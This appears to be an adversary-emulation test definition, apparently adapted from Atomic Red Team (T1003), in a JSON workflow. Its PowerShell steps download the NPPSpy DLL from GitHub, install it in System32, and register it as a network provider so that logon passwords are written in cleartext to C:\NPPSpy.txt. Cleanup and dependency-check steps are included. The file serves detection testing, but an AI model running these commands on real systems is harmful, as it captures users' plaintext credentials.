@@ -1,0 +1,97 @@
+{
+  "id": "9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6",
+  "name": "Credential Dumping with NPPSpy",
+  "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "48cdccc8-5861-40fb-96f1-a7d654af095f",
+      "type": "execute-command",
+      "data": {
+        "command": "Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "eaa2edee-9cd7-432b-9a14-f9daf86f7ec0",
+      "type": "execute-command",
+      "data": {
+        "command": "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "78753fd1-09c1-4446-b7d6-70fd9569c666",
+      "name": "Check dependency 1/1",
+      "description": "NPPSpy.dll must be available in ExternalPayloads directory",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\") {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6afaf2bf-9544-49fc-843d-d00705b87e3e",
+      "name": "Resolve dependency 1/1",
+      "description": "NPPSpy.dll must be available in ExternalPayloads directory",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\"",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "522932a5-2033-46d5-8205-45a969bd8bfc",
+      "name": "Re-check dependency 1/1",
+      "description": "NPPSpy.dll must be available in ExternalPayloads directory",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\") {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "48cdccc8-5861-40fb-96f1-a7d654af095f",
+      "p": "on-success",
+      "o": "eaa2edee-9cd7-432b-9a14-f9daf86f7ec0"
+    },
+    {
+      "s": "48cdccc8-5861-40fb-96f1-a7d654af095f",
+      "p": "on-failure",
+      "o": "eaa2edee-9cd7-432b-9a14-f9daf86f7ec0"
+    },
+    {
+      "s": "78753fd1-09c1-4446-b7d6-70fd9569c666",
+      "p": "on-success",
+      "o": "48cdccc8-5861-40fb-96f1-a7d654af095f"
+    },
+    {
+      "s": "78753fd1-09c1-4446-b7d6-70fd9569c666",
+      "p": "on-failure",
+      "o": "6afaf2bf-9544-49fc-843d-d00705b87e3e"
+    },
+    {
+      "s": "6afaf2bf-9544-49fc-843d-d00705b87e3e",
+      "p": "on-success",
+      "o": "522932a5-2033-46d5-8205-45a969bd8bfc"
+    },
+    {
+      "s": "522932a5-2033-46d5-8205-45a969bd8bfc",
+      "p": "on-failure",
+      "o": "48cdccc8-5861-40fb-96f1-a7d654af095f"
+    }
+  ],
+  "tags": [
+    "T1003",
+    "atomic-red-team"
+  ]
+}
